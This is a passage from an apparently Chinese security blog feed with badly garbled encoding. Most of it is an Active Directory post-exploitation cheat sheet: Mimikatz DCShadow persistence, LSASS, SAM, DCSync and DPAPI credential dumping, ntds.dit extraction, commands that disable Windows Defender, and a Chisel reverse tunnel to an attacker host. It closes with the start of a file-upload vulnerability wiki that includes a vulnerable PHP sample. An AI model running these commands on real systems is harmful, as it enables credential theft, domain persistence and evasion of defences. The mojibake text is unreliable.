èŽ·å–ç¼“å­˜çš„å‡­æ®ï¼ˆå¦‚æžœæœ‰ï¼‰Get-RemoteCachedCredential -ComputerName dcorp-dc DCShadowDCShadowæ˜¯ä¸€ç§é€šè¿‡ä¸´æ—¶æ¨¡ä»¿åŸŸæŽ§åˆ¶å™¨æ¥æŽ©ç›–æŸäº›åŠ¨ä½œçš„æ”»å‡»ã€‚å¦‚æžœæ‚¨åœ¨æ ¹åŸŸä¸­å…·æœ‰Domain Adminæˆ–Enterprise Adminç‰¹æƒï¼Œåˆ™å¯ä»¥å°†å…¶ç”¨äºŽæž—çº§åˆ«çš„æŒä¹…æ€§ã€‚ ï¼ˆå¯é€‰ï¼‰ä½œä¸ºåŸŸç®¡ç†å‘˜ï¼Œä¸ºé€‰å®šçš„ç”¨æˆ·æä¾›DCShadowæ”»å‡»æ‰€éœ€çš„ç‰¹æƒï¼ˆä½¿ç”¨Set-DCShadowPermissions.ps1cmdletï¼‰ã€‚ 1Set-DCShadowPermissions -FakeDC mcorp-student35 -SamAccountName root355user -Username student355 -Verbose ç„¶åŽï¼Œåœ¨ä»»ä½•è®¡ç®—æœºä¸Šï¼Œä½¿ç”¨Mimikatzè¿›è¡ŒDCShadowæ”»å‡»ã€‚ 123456789101112131415# ä¸ºç”¨æˆ·è®¾ç½®SPNlsadump::dcshadow /object:root355user /attribute:servicePrincipalName /value:&quot;SuperHacker/ServicePrincipalThingey&quot;# è®¾ç½®ç”¨æˆ·çš„SIDåŽ†å²è®°å½•ï¼ˆæœ‰æ•ˆåœ°æŽˆäºˆä»–ä»¬ä¼ä¸šç®¡ç†å‘˜æƒé™ï¼‰lsadump::dcshadow /object:root355user /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519# ä¸ºç”¨æˆ·è®¾ç½®AdminSDHolderå®¹å™¨ä¸Šçš„å®Œå…¨æŽ§åˆ¶æƒé™## éœ€è¦æ£€ç´¢å½“å‰çš„ACLï¼š(New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local&quot;)).psbase.ObjectSecurity.sddl## ç„¶åŽèŽ·å–ç›®æ ‡ç”¨æˆ·çš„SIDï¼šGet-NetUser -UserName student355 | select objectsid## æœ€åŽï¼Œæ·»åŠ å®Œå…¨æŽ§åˆ¶åŽŸè¯­ (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for userlsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-45109) æœ€åŽï¼Œä»ŽDAä¼šè¯æˆ–ä»¥å‰æä¾›DCShadowPermissionsçš„ç”¨æˆ·çš„ä¼šè¯ä¸­ï¼Œè¿è¡ŒDCShadowæ”»å‡»ã€‚å…ˆå‰ä¸Šæ¼”çš„åŠ¨ä½œå°†åœ¨ä¸ä¿ç•™æ—¥å¿—çš„æƒ…å†µä¸‹æ‰§è¡ŒðŸ˜ˆ 1lsadump::dcshadow /push Post-ExploitationLSASSä¿æŠ¤æœ‰æ—¶ï¼ŒLSASSè¢«é…ç½®ä¸ºä½œä¸ºå—ä¿æŠ¤è¿›ç¨‹ï¼ˆPPLï¼‰è¿è¡Œã€‚æ‚¨å¯ä»¥ä½¿ç”¨PowerShellè¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ 1Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨ä¸ä»…å¯ä»¥è½¬å‚¨æˆ–è§£æžLSASSï¼Œè¿˜éœ€è¦ä½¿ç”¨ç¦ç”¨è¯¥ä¿æŠ¤mimidrv.sysã€‚æˆ‘ä¸ä¼šåœ¨è¿™é‡Œè®¨è®ºå¦‚ä½•åšã€‚ Dumping secrets with Mimikatz123456789101112# è½¬å‚¨ç™»å½•å¯†ç sekurlsa::logonpasswords# ä»ŽDCè½¬å‚¨æ‰€æœ‰åŸŸæ•£åˆ—## æ³¨æ„ï¼šå¸¦æœ‰/patchçš„æ‰€æœ‰å†…å®¹éƒ½å¾ˆå˜ˆæ‚ï¼Œå› ä¸ºå®ƒ_writes_åˆ°LSASSðŸš©lsadump::lsa /patch# ä»…è½¬å‚¨æœ¬åœ°ç”¨æˆ·lsadump::sam# DCSync (requires &apos;ldap&apos; SPN)lsadump::dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local Windows Credential Vaultè½¬å‚¨ æˆ‘åœ¨å’Œä¸€èµ·ä½¿ç”¨æ—¶é‡åˆ°äº†ä¸€äº›é—®é¢˜Invoke-Mimikatz.ps1ã€‚å¦‚æžœé‡åˆ°é—®é¢˜ï¼Œè¯·å°è¯•ä½¿ç”¨æœ¬æœºMimikatzã€‚ 1234567891011121314151617# è½¬å‚¨Windowsæœºå¯†ï¼Œä¾‹å¦‚è®¡åˆ’ä»»åŠ¡çš„å­˜å‚¨å‡­æ®ï¼ˆå…ˆæå‡æƒé™ï¼‰vault::listvault::cred /patch# è½¬å‚¨Windowsæœºå¯†DPAPIæ–¹æ³•ï¼ˆå™ªéŸ³å°‘ï¼Œæ²¡æœ‰ç‰¹å®šæƒé™ï¼Œéœ€è¦ï¼‰## æ›´å¤šä¿¡æ¯: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials## é¦–å…ˆï¼ŒèŽ·å–ç‰¹å®šå¯†é’¥çš„ä¸»å¯†é’¥çš„GUIDdpapi::cred /in:C:\Users\appadmin\AppData\local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D## LSASSçš„EITHER Grab dpapié”®sekurlsa::dpapi## æˆ–æŠ“å–å¹¶ç¼“å­˜ç‰¹å®šå¯†é’¥dpapi::masterkey /rpc /in:C:\Users\appadmin\AppData\Roaming\Microsoft\Protect\S-1-5-21-3965405831-1015596948-2589850225-1118\a89b97d2-b520-462d-a924-d57df68c543b## Mimikatzå°†ç¼“å­˜ä¸»å¯†é’¥ï¼ˆä½¿ç”¨dpapi::cacheæ£€æŸ¥ï¼‰## Then run the initial dpapi::cred command again to get the juice! æ²¡æœ‰Mimikatzçš„å¯†ç hashè½¬å‚¨æˆ‘ä»¬ä¹Ÿå¯ä»¥è§£æžç³»ç»Ÿæœºå¯†ï¼Œè€Œæ— éœ€åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šç›´æŽ¥ä½¿ç”¨Mimikatzã€‚ Dumping LSASSè¿è¡ŒMimikatzçš„é¦–é€‰æ–¹æ³•æ˜¯ä½¿ç”¨ç›®æ ‡ä¸­LSASSå†…å­˜çš„è½¬å‚¨å‰¯æœ¬åœ¨æœ¬åœ°è¿›è¡Œã€‚Dumpertï¼ŒProcdumpæˆ–å…¶ä»–ï¼ˆè‡ªå®šä¹‰ï¼‰å·¥å…·å¯ç”¨äºŽè½¬å‚¨LSASSå†…å­˜ã€‚ 123# é€šè¿‡è¿›ç¨‹å¿«ç…§ï¼ˆ-rï¼‰è½¬å‚¨LSASSå†…å­˜ï¼Œé¿å…ä¸Žä¹‹ç›´æŽ¥äº¤äº’.\procdump.exe -r -ma lsass.exe lsass.dmp# æˆ–è€…ä»»åŠ¡ç®¡ç†å™¨æ‰¾åˆ°lsass.exeè¿›ç¨‹å³é”®åˆ›å»ºè½¬å‚¨æ–‡ä»¶ åœ¨æˆ‘ä»¬çš„æ”»å‡»ç³»ç»Ÿä¸Šä¸‹è½½å†…å­˜è½¬å‚¨æ–‡ä»¶åŽï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡ŒMimikatzå¹¶åˆ‡æ¢åˆ°â€œ Minidumpâ€æ¨¡å¼ä»¥å¦‚ä¸‹æ–¹å¼è§£æžæ–‡ä»¶ã€‚ 12sekurlsa::minidump lsass.dmpsekurlsa::logonpasswords full Dumping secrets from the registryæˆ‘ä»¬å¯ä»¥ä»Žæ³¨å†Œè¡¨ä¸­è½¬å‚¨æœºå¯†å¹¶â€œç¦»çº¿â€è§£æžæ–‡ä»¶ï¼Œä»¥èŽ·å–ç³»ç»Ÿæœºå¯†åˆ—è¡¨ã€‚ðŸš© åœ¨ç›®æ ‡ä¸Šï¼Œæˆ‘ä»¬è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 123reg.exe save hklm\sam c:\users\public\downloads\sam.savereg.exe save hklm\system c:\users\public\downloads\system.savereg.exe save hklm\security c:\users\public\downloads\security.save ç„¶åŽï¼Œåœ¨æˆ‘ä»¬çš„æ”»å‡»ç›’å­ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Impacketä¸¢å¼ƒç§˜å¯†ï¼š 1impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL &gt; secrets.out ntdsutilntdsutil win2008å¼€å§‹DCä¸­è‡ªå¸¦çš„å·¥å…· 123456789#äº¤äº’å¼ntdsutilsnapshotactivate instance ntdscreatemount [GUID]# copy å®Œä¹‹åŽå†æ‰§è¡Œunmout [GUID]del [GUID] 12345# éžäº¤äº’å¼ntdsutil snapshot "activate instance ntds" create quit quitntdsutil snapshot "mount &#123;GUID&#125;" quit quitcopy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.ditntdsutil snapshot "unmount &#123;GUID&#125;" "delete &#123;GUID&#125;" quit quit QuarkPwDumpåˆ†æž [ä¸‹è½½åœ°å€][https://github.com/quarkslab/quarkspwdump]åœ¨çº¿æå–ï¼ˆç›´æŽ¥åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œï¼Œå®žæˆ˜ä¸­ä¸é€‰æ‹©æ­¤æ–¹å¼ã€‚ï¼‰ 1QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit ç¦»çº¿æå– éœ€è¦ä¸¤ä¸ªæ–‡ä»¶ ntds.dit å’Œ system.hive ï¼Œ å…¶ä¸­system.hiveå¯é€šè¿‡reg save hklm\system system.hiveèŽ·å– 1QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive &gt;c:\hash.txt ntdsutil: ifm æ¨¡å—WINDOWS SERVER 2008-2016 123456C:\&gt; ntdsutilntdsutil: activate instance ntdsntdsutil: ifmifm: create full c:\auditifm: quitntdsutil: quit ä½¿ç”¨NtdsAudit.exeä¸‹è½½åœ°å€è§£å‡ºntdsçš„hash 1NtdsAudit.exe "ntds.dit" -s "SYSTEM" -p pwdump.txt --users-csv users.csv NtdsAuditéœ€è¦ntds.dit Active Directoryæ•°æ®åº“ï¼ŒSYSTEM å¦‚æžœè½¬å‚¨å¯†ç å“ˆå¸Œï¼Œåˆ™éœ€è¦æ³¨å†Œè¡¨é…ç½®å•å…ƒã€‚è¿™äº›æ–‡ä»¶ç”±åŸŸæŽ§åˆ¶å™¨é”å®šï¼Œå› æ­¤æ— æ³•ç®€å•åœ°å¤åˆ¶å’Œç²˜è´´ã€‚ä»ŽåŸŸæŽ§åˆ¶å™¨èŽ·å–è¿™äº›æ–‡ä»¶çš„æŽ¨èæ–¹æ³•æ˜¯ä½¿ç”¨å†…ç½®ntdsutilå®žç”¨ç¨‹åºã€‚ ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼ˆcmd.exeï¼‰ã€‚è¦ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼Œè¯·å•å‡»â€œå¯åŠ¨â€ã€‚åœ¨â€œå¼€å§‹æœç´¢â€ä¸­ï¼Œé”®å…¥å‘½ä»¤æç¤ºç¬¦ã€‚åœ¨â€œå¼€å§‹â€èœå•çš„é¡¶éƒ¨ï¼Œå³é”®å•å‡»â€œå‘½ä»¤æç¤ºç¬¦â€ï¼Œç„¶åŽå•å‡»â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€ã€‚å¦‚æžœå‡ºçŽ°â€œç”¨æˆ·å¸æˆ·æŽ§åˆ¶â€å¯¹è¯æ¡†ï¼Œè¯·è¾“å…¥ç›¸åº”çš„å‡­æ®ï¼ˆå¦‚æžœå·²è¯·æ±‚ï¼‰å¹¶ç¡®è®¤å…¶æ˜¾ç¤ºçš„æ“ä½œæ˜¯æ‚¨æ‰€éœ€çš„æ“ä½œï¼Œç„¶åŽå•å‡»â€œç»§ç»­â€ã€‚ 12345678910111213# åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åŽæŒ‰ENTERé”®ï¼šntdsutil# åœ¨ntdsutilæç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åŽæŒ‰Enterï¼šactivate instance ntds# åœ¨ntdsutilæç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åŽæŒ‰Enterï¼šifm# åœ¨ifmæç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åŽæŒ‰Enterï¼šcreate full &lt;Drive&gt;:\&lt;Folder&gt;# &lt;Drive&gt;:\&lt;Folder&gt; æ˜¯è¦åˆ›å»ºçš„æ–‡ä»¶çš„æ–‡ä»¶å¤¹è·¯å¾„ã€‚ ä¾‹å¦‚ï¼Œä»¥ä¸‹å‘½ä»¤å°†æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯ï¼Œè¾“å‡ºpwdump.txtåŒ…å«å¯†ç å“ˆå¸Œå€¼çš„æ–‡ä»¶ï¼Œå¹¶è¾“å‡ºusers.csvåŒ…å«æ¯ä¸ªç”¨æˆ·å¸æˆ·è¯¦ç»†ä¿¡æ¯çš„æ–‡ä»¶ã€‚ 1ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv Linux æ˜Žæ–‡å¯†ç çš„èŽ·å–mimipenguin git clone https://github.com/huntergregal/mimipenguin æ”¯æŒçš„æ“ä½œç³»ç»Ÿ os service supported Ubuntu Desktop 12.04 LTS x64 gnome-keyring-daemon (3.18.3) Y Ubuntu Desktop 16.04 LTS x64 gnome-keyring-daemon (3.18.3) Y Fedora Workstation 25 (x86_64) gnome-keyring-daemon (3.20.0) Y Fedora Workstation 27 (x86_64) gnome-keyring-daemon (3.20.1) Y Kali-rolling x64 gnome-keyring-daemon (3.28.0.2) Y ä»Žå·å½±å‰¯æœ¬ä¸­è½¬å‚¨å¿«ç…§æˆ‘ä»¬è¿˜å¯ä»¥åˆ›å»ºSAMå’ŒSYSTEMæ–‡ä»¶çš„â€œå·å½±å‰¯æœ¬â€ ï¼ˆå®ƒä»¬å§‹ç»ˆé”å®šåœ¨å½“å‰ç³»ç»Ÿä¸Šï¼‰ï¼Œå› æ­¤æˆ‘ä»¬ä»ç„¶å¯ä»¥å°†å®ƒä»¬å¤åˆ¶åˆ°æœ¬åœ°ç³»ç»Ÿä¸­ã€‚ä¸ºæ­¤éœ€è¦æå‡çš„æç¤º 123wmic shadowcopy call create Volume='C:\'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\samcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system å…³é—­Windows DefenderðŸ‘€ðŸš© 123Set-MpPreference -DisableRealtimeMonitoring $trueSet-MpPreference -DisableIOAVProtection $true æˆ–å°†Defenderä¿æŒå¯ç”¨çŠ¶æ€ï¼Œç„¶åŽä»Žå…¶ä¸­åˆ é™¤ç­¾åã€‚ 1"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All Chisel ä»£ç†è¿™æ˜¯ä¸€ä¸ªæœ‰å…³å¦‚ä½•è®¾ç½®Socksä»£ç†ä»¥åœ¨å—æ„ŸæŸ“ä¸»æœºä¸Šè¿›è¡Œå‡¿å‡¿çš„ç¤ºä¾‹ã€‚å‡¿å­è¿˜å¯ä»¥åšæ›´å¤šçš„äº‹æƒ…ï¼ åœ¨æ”»å‡»è€…æœºå™¨ï¼ˆLinuxæˆ–Windowsï¼‰ä¸Šï¼š 1./chisel server -p 8888 --reverse ç›®æ ‡æ‰§è¡Œï¼š 1.\chisel_windows_386.exe client 10.10.16.7:8888 R:8001:127.0.0.1:9001 çŽ°åœ¨ï¼Œæˆ‘ä»¬æ­£åœ¨ä¾¦å¬localhost:8001æ”»å‡»æœºï¼Œä»¥å°†æµé‡è½¬å‘ç»™target:9001ã€‚ ç„¶åŽï¼Œæ‰“å¼€SocksæœåŠ¡å™¨ã€‚ä¼°è®¡çš„æ­£å¥½ï¼š 1.\chisel_windows_386.exe server -p 9001 --socks5 åœ¨æ”»å‡»æœºä¸Šï¼š 1./chisel client localhost:8001 socks çŽ°åœ¨ï¼Œåœ¨æ”»å‡»è®¡ç®—æœºçš„ç«¯å£1080ä¸Šæ‰“å¼€äº†ä¸€ä¸ªä»£ç†ã€‚ Juicy filesæœ‰å¾ˆå¤šæ–‡ä»¶å¯èƒ½åŒ…å«æœ‰è¶£çš„ä¿¡æ¯ã€‚WinPEASç±»çš„å·¥å…·æˆ–PowerSploitç±»çš„é›†åˆå¯èƒ½æœ‰åŠ©äºŽè¯†åˆ«å¤šæ±çš„æ–‡ä»¶ï¼ˆç”¨äºŽprivescæˆ–post-exploitationï¼‰ã€‚ ä»¥ä¸‹æ˜¯æˆ‘é‡åˆ°è¿‡çš„ä¸€äº›ç›¸å…³æ–‡ä»¶çš„åˆ—è¡¨ã€‚æ ¹æ®è®¡ç®—æœºä¸Šå®‰è£…çš„ç¨‹åºå’Œ/æˆ–æœåŠ¡æ£€æŸ¥æ–‡ä»¶ã€‚ æ­¤å¤–ï¼Œä¸è¦å¿˜è®°ä½¿ç”¨sqlcmdæˆ–æžšä¸¾ä»»ä½•æœ¬åœ°æ•°æ®åº“Invoke-SqlCmdã€‚ 123456789101112131415161718192021222324252627282930# æ‰€æœ‰ç”¨æˆ·æ–‡ä»¶å¤¹## å¦‚æžœæ–‡ä»¶å¤ªå¤šï¼Œè¯·é™åˆ¶æ­¤å‘½ä»¤;ï¼‰tree /f /a C:\Users# Web.configC:\inetpub\www\*\web.config# Unattend æ–‡ä»¶C:\Windows\Panther\Unattend.xml# RDP é…ç½®æ–‡ä»¶C:\ProgramData\Configs\# Powershell scripts/config æ–‡ä»¶C:\Program Files\Windows PowerShell\# PuTTy é…ç½®æ–‡ä»¶C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty# FileZilla è¯ä¹¦C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml# Jenkins creds (also check out the Windows vault, see above)C:\Program Files\Jenkins\credentials.xml# WLAN profilesC:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml# TightVNC å¯†ç  (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select -ExpandProperty Password]]></content>
      <categories>
        <category>å¤‡å¿˜å½•</category>
      </categories>
      <tags>
        <tag>åŸŸ</tag>
        <tag>å¤‡å¿˜å½•</tag>
        <tag>AD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ¼æ´žå®‰å…¨çŸ¥è¯†Wiki]]></title>
    <url>%2F2020%2F12%2F04%2F%E6%BC%8F%E6%B4%9E%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86Wiki.html</url>
    <content type="text"><![CDATA[æ¼æ´žå®‰å…¨çŸ¥è¯†Wiki æœ¬æ–‡ä»Žæ¼æ´žç±»åž‹çš„ç»´åº¦è¿›è¡ŒçŸ¥è¯†ä½“ç³»çš„æ•´ç†ï¼ŒåŒ…å«äº†æ¼æ´žä»‹ç»ã€æ¼æ´žå±å®³ã€æ”»å‡»æ¡ˆä¾‹ã€æ£€æµ‹æ–¹æ³•ã€è§£å†³æ–¹æ¡ˆçš„å†…å®¹ï¼Œéƒ¨åˆ†æ¼æ´žç±»åž‹ä»Žä»£ç å±‚äº†è§£æ­¤ç±»æ¼æ´žåŽŸç†åŠä¿®å¤æ–¹æ³•ã€‚æŒç»­æ›´æ–°ã€‚ ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´žæè¿° æ–‡ä»¶ä¸Šä¼ æ¼æ´žé€šå¸¸ç”±äºŽç½‘é¡µä»£ç ä¸­çš„æ–‡ä»¶ä¸Šä¼ è·¯å¾„å˜é‡è¿‡æ»¤ä¸ä¸¥æˆ–Webserverç›¸å…³è§£æžæ¼æ´žæœªä¿®å¤è€Œé€ æˆçš„ï¼Œå¦‚æžœæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½å®žçŽ°ä»£ç æ²¡æœ‰ä¸¥æ ¼é™åˆ¶ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åŽç¼€ä»¥åŠæ–‡ä»¶ç±»åž‹ï¼Œæ”»å‡»è€…å¯é€šè¿‡Web è®¿é—®çš„ç›®å½•ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼ŒåŒ…æ‹¬ç½‘ç«™åŽé—¨æ–‡ä»¶ï¼ˆWebshellï¼‰ï¼Œè¿›è€Œè¿œç¨‹æŽ§åˆ¶ç½‘ç«™æœåŠ¡å™¨ã€‚ æ¼æ´žå±å®³ éžæ³•ç”¨æˆ·å¯ä»¥åˆ©ç”¨ä¸Šä¼ çš„æ¶æ„è„šæœ¬æ–‡ä»¶æŽ§åˆ¶æ•´ä¸ªç½‘ç«™ï¼Œç”šè‡³æŽ§åˆ¶æœåŠ¡å™¨ã€‚è¿™ä¸ªæ¶æ„çš„è„šæœ¬æ–‡ä»¶ï¼Œåˆè¢«ç§°ä¸ºWebshellï¼Œä¹Ÿå¯å°†Webshellè„šæœ¬ç§°ä¸ºä¸€ç§ç½‘é¡µåŽé—¨ï¼ŒWebshellè„šæœ¬å…·æœ‰éžå¸¸å¼ºå¤§çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æŸ¥çœ‹æœåŠ¡å™¨ç›®å½•ã€ã€‚æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ç­‰ã€‚ æ”»å‡»æ¡ˆä¾‹ 12345678910111213// å®šä¹‰å›¾ç‰‡æ‰€åœ¨çš„ç›®æ ‡ä½ç½®var allow_ext = ".jpg|.png|.gif"; // ä¸Šä¼ çš„æ–‡ä»¶å°†è¢«ä¿å­˜ã€‚$target = "pictures/" . basename($_FILES['uploadedfile']['name']);// å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))&#123;echo "The picture has been successfully uploaded.";&#125;else&#123;echo "There was an error uploading the picture, please try again.";&#125; å¯¹åº”ç”¨å¹³å°çš„æ”»å‡» å°†.jspæ–‡ä»¶ä¸Šä¼ åˆ°Web treeâ€”â€”ä»¥Webç”¨æˆ·èº«ä»½æ‰§è¡Œçš„JSPä»£ç  ä¸Šä¼ .gifæ–‡ä»¶ä»¥é‡æ–°è°ƒæ•´å¤§å°â€”â€”åˆ©ç”¨å›¾ç‰‡åº“æ¼æ´ž ä¸Šä¼ å¤§æ–‡ä»¶â€”â€”æ–‡ä»¶ç©ºé—´æ‹’ç»æœåŠ¡ ä½¿ç”¨æ¶æ„è·¯å¾„æˆ–åç§°ä¸Šä¼ æ–‡ä»¶â€”â€”è¦†ç›–å…³é”®æ–‡ä»¶ ä¸Šè½½åŒ…å«ä¸ªäººæ•°æ®çš„æ–‡ä»¶â€”â€”å…¶ä»–ç”¨æˆ·å¯ä»¥è®¿é—®å®ƒ ä¸Šè½½åŒ…å«â€œæ ‡ç­¾â€çš„æ–‡ä»¶â€”â€”æ ‡ç­¾è¢«æ‰§è¡Œä¸ºâ€œåŒ…å«â€åœ¨ç½‘é¡µä¸­çš„ä¸€éƒ¨åˆ† ä¸Šè½½è¦ç”±é˜²ç—…æ¯’è½¯ä»¶æ‰«æçš„.raræ–‡ä»¶â€”â€”åœ¨è¿è¡Œæ˜“å—æ”»å‡»çš„é˜²ç—…æ¯’è½¯ä»¶çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œçš„å‘½ä»¤ æ£€æµ‹æ–¹æ³• æ£€æµ‹å‰ç«¯ä»£ç å¯ä»¥é€šè¿‡JSç¦ç”¨ï¼Œå°è¯•ä¸Šä¼ å…¶ä»–åŽç¼€åæ ¼å¼çš„æ–‡ä»¶çœ‹æ˜¯å¦ä¸Šä¼ æˆåŠŸï¼› æ£€æµ‹content-typeï¼Œé€šè¿‡ä¿®æ”¹content-typeçš„æ–‡ä»¶ç±»åž‹å°è¯•ä¸Šä¼ ç›®æ ‡æ ¼å¼æ–‡ä»¶ï¼› æ£€æµ‹æ–‡ä»¶å¤´åˆ¤æ–­æ–‡ä»¶ç±»åž‹ï¼Œé€šè¿‡ä½¿ç”¨å¸¸è§çš„æ–‡ä»¶å¤´çš„hexç¼–ç æ¥ç¡®è®¤æ–‡ä»¶ç±»åž‹ï¼› æ£€æµ‹ç›®æ ‡æ˜¯å¦å­˜åœ¨IISè§£æžæ¼æ´žï¼Œå‡è®¾ä¸Šä¼ ä¸€ä¸ªåä¸º&quot;test.asp;xxx.jpg&quot;æ—¶ï¼Œè¯¥æ–‡ä»¶ä¼šè¢«å½“åšaspæ–‡ä»¶è§£æžï¼› æ£€æµ‹ç›®æ ‡æ˜¯å¦æœ‰Apacheè§£æžæ¼æ´žï¼Œæ£€æµ‹ç›®æ ‡æ˜¯å¦å¯ä»¥ä½¿ç”¨%00æˆªæ–­ç­‰ï¼› ä¿®å¤å»ºè®® å¯¹ä¸Šä¼ æ–‡ä»¶ç±»åž‹è¿›è¡Œé™åˆ¶ï¼Œå¹¶ä¸”ä¸èƒ½åªåšå‰ç«¯çš„é™åˆ¶ï¼Œè€Œè¦å‰ç«¯å’ŒåŽç«¯ä¸€èµ·é™åˆ¶ï¼ŒåŽç«¯å¯ä»¥è¿›è¡Œæ‰©å±•åæ£€æµ‹ï¼Œé‡å‘½åæ–‡ä»¶ï¼ŒMIMEç±»åž‹æ£€æµ‹ä»¥åŠé™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œæˆ–æ˜¯å°†ä¸Šä¼ çš„æ–‡ä»¶æ”¾åœ¨å®‰å…¨çš„è·¯å¾„ä¸‹ï¼Œå°½é‡æ”¾äºŽWeb serverä¹‹å¤–çš„è¿œç¨‹æœåŠ¡å™¨ç­‰ã€‚ ä¸¥æ ¼é™åˆ¶å’Œæ ¡éªŒä¸Šä¼ çš„æ–‡ä»¶ï¼Œç¦æ­¢ä¸Šä¼ æ¶æ„ä»£ç çš„æ–‡ä»¶ã€‚åŒæ—¶é™åˆ¶ç›¸å…³ç›®å½•çš„æ‰§è¡Œæƒé™ï¼Œé˜²èŒƒWebshellæ”»å‡»ã€‚ å¯¹ä¸Šä¼ æ–‡ä»¶æ ¼å¼è¿›è¡Œä¸¥æ ¼æ ¡éªŒåŠå®‰å…¨æ‰«æï¼Œé˜²æ­¢ä¸Šä¼ æ¶æ„è„šæœ¬æ–‡ä»¶ï¼› è®¾ç½®æƒé™é™åˆ¶ï¼Œç¦æ­¢ä¸Šä¼ ç›®å½•çš„æ‰§è¡Œæƒé™ï¼› ä¸¥æ ¼é™åˆ¶å¯ä¸Šä¼ çš„æ–‡ä»¶ç±»åž‹ï¼› ä¸¥æ ¼é™åˆ¶ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„ã€‚ æ–‡ä»¶æ‰©å±•åæœåŠ¡ç«¯ç™½åå•æ ¡éªŒã€‚ æ–‡ä»¶å†…å®¹æœåŠ¡ç«¯æ ¡éªŒã€‚ ä¸Šä¼ æ–‡ä»¶é‡å‘½åã€‚ éšè—ä¸Šä¼ æ–‡ä»¶è·¯å¾„ã€‚ ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´žæè¿° æŸäº›ç½‘ç«™å¯èƒ½å› ä¸ºä¸šåŠ¡éœ€è¦ï¼Œæä¾›æ–‡ä»¶æŸ¥çœ‹æˆ–è€…ä¸‹è½½çš„åŠŸèƒ½ï¼Œå¦‚æžœå¯¹ç”¨æˆ·æŸ¥çœ‹æˆ–è€…éœ€è¦ä¸‹è½½çš„æ–‡ä»¶ä¸åšé™åˆ¶ï¼Œé‚£ä¹ˆä¸€äº›æ”»å‡»è€…å¯èƒ½æž„é€ æ¶æ„ä»£ç ä¸‹è½½ç½‘ç«™çš„æ•æ„Ÿæ–‡ä»¶ï¼ˆæºä»£ç ï¼Œæ•°æ®åº“æ–‡ä»¶ï¼Œç™»å½•å¯†ç ç­‰ï¼‰ã€‚ æ¼æ´žå±å®³ å¯ä»¥ä¸‹è½½ç›®æ ‡æœåŠ¡å™¨çš„ä»»æ„æ–‡ä»¶ï¼Œå¦‚ç½‘ç«™æºç ã€ç½‘ç«™é…ç½®æ–‡ä»¶ã€ç³»ç»Ÿé…ç½®æ–‡ä»¶ç­‰ã€‚ é€šè¿‡èŽ·å–çš„æºç è¿›è¡Œä»£ç å®¡è®¡ï¼Œè¿›ä¸€æ­¥èŽ·å¾—å¯åˆ©ç”¨çš„æ¼æ´žã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šç”¨header()ä¸‹è½½ï¼š 